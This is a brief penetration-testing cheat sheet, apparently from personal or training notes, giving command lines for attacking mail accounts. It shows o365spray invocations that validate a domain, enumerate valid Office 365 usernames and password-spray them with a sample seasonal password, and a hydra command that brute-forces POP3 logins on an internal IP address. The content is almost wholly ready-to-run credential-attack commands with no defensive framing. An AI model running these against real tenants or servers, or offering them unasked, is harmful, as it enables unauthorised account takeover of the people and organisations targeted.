#### Office 365 spray
https://github.com/0xZDH/o365spray


```shell
python3 o365spray.py --validate --domain msplaintext.xyz
```
Identify usernames 
```shell
python3 o365spray.py --enum -U users.txt --domain msplaintext.xyz        
```
Password spraying
```shell
python3 o365spray.py --spray -U usersfound.txt -p 'March2022!' --count 1 --lockout 1 --domain msplaintext.xyz
```
### Brute Force 
```shell-session
hydra -L users.txt -p 'Company01!' -f 10.10.110.20 pop3
```